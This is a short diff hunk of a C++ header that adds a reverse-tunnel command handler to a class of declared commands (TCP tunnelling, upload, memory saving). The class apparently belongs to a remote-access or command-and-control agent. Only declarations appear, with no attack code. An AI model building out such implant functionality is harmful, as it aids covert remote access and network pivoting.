@@ -60,6 +60,7 @@ public:
 	void CmdTunnelMsgConnectTCP(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdTunnelMsgWrite(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdTunnelMsgClose(ULONG commandId, Packer* inPacker, Packer* outPacker);
+	void CmdTunnelMsgReverse(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker);
 
 	void CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker);
